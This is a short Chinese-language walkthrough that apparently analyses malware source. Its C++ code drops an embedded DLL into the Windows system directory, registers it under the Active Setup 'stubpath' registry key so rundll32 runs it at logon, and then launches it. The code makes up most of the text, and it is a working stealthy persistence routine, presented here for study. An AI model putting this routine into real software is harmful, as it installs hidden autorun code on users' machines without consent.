

# main函数



```c++
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.
    ActiveXSetup();
	return 0;
}

```



也没干什么

也就调用一个函数



然后是进入函数分析

```c++

void ActiveXSetup()
{
	HKEY hKey;
	char strFileName[MAX_PATH];           //dll文件名
	char ActivexStr[1024];                //用于存储ActiveX的键字串
	char ActiveXPath[MAX_PATH];            //ActiveX路径
	char ActiveXKey[64];                   //ActiveX 的GUID字串
    char strCmdLine[MAX_PATH];              //存储启动的命令行参数
	
	
    ZeroMemory(strFileName,MAX_PATH);
	ZeroMemory(ActiveXPath,MAX_PATH);
	ZeroMemory(ActivexStr,1024);
	ZeroMemory(ActiveXKey,MAX_PATH);
    ZeroMemory(strCmdLine,MAX_PATH);
	
    //阶段1---------------------------------------------------------获取一些字符串路径资源
 
	//得到Activex路径
	strcpy(ActiveXPath,"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\");
	//得到Activex的GUID
	GetNUM(ActiveXKey);
	//构造dll完整文件名
    GetSystemDirectory(strFileName,MAX_PATH);
	strcat(strFileName,"\\");
	strcat(strFileName,ActiveXKey);
	strcat(strFileName,".dll");
    //构造ActiveX的注册表键值
	sprintf(ActivexStr,"%s%s",ActiveXPath,ActiveXKey);
	
	
	 //阶段2--------------------------------------------------------创建对应的注册表项
	//创建这个注册表
	RegCreateKey(HKEY_LOCAL_MACHINE,ActivexStr,&hKey);
	
	//构造程序启动的命令行参数
	sprintf(strCmdLine,"%s %s,FirstRun","rundll32.exe",strFileName);
	//将参数写道注册表中
	RegSetValueEx(hKey,"stubpath",0,REG_EXPAND_SZ,(BYTE *)strCmdLine,lstrlen(strCmdLine));
	RegCloseKey(hKey);
	
	 //阶段3--------------------------------------------------------在指定路径释放资源生成dll文件
    //释放文件
    CreateEXE(strFileName,IDR_DLL,"DLL");
	
	
	 //阶段4-------------------------------------------------------利用rundll32启动dll的某一个函数
	//启动exe
	STARTUPINFO StartInfo;
	PROCESS_INFORMATION ProcessInformation;
	StartInfo.cb=sizeof(STARTUPINFO);
	StartInfo.lpDesktop=NULL;
	StartInfo.lpReserved=NULL;
	StartInfo.lpTitle=NULL;
	StartInfo.dwFlags=STARTF_USESHOWWINDOW;
	StartInfo.cbReserved2=0;
	StartInfo.lpReserved2=NULL;
	StartInfo.wShowWindow=SW_SHOWNORMAL;
	BOOL bReturn=CreateProcess(NULL,strCmdLine,NULL,NULL,FALSE,NULL,NULL,NULL,&StartInfo,&ProcessInformation);
	return ;
}

```

